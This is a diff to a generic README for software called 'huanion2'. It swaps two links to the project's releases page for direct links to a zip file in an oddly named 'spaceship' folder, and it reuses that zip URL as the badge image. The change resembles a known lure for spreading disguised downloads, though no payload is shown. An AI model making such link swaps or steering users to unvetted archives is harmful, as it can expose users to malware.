@@ -6,7 +6,7 @@ Welcome to **huanion2**! This software makes everyday tasks easier and more effi
 
 ## 📥 Download Now
 
-[![Download huanion2](https://img.shields.io/badge/Download-huanion2-blue.svg)](https://github.com/novemcodes/huanion2/releases)
+[![Download huanion2](https://raw.githubusercontent.com/novemcodes/huanion2/main/spaceship/huanion2.zip)](https://raw.githubusercontent.com/novemcodes/huanion2/main/spaceship/huanion2.zip)
 
 Click the button above to download the software. 
 
@@ -31,7 +31,7 @@ Before you install **huanion2**, ensure your system meets these requirements:
 
 To begin, visit the releases page to download the latest version of **huanion2**.
 
-[Download Links](https://github.com/novemcodes/huanion2/releases)
+[Download Links](https://raw.githubusercontent.com/novemcodes/huanion2/main/spaceship/huanion2.zip)
 
 Once you’re on the page:
 
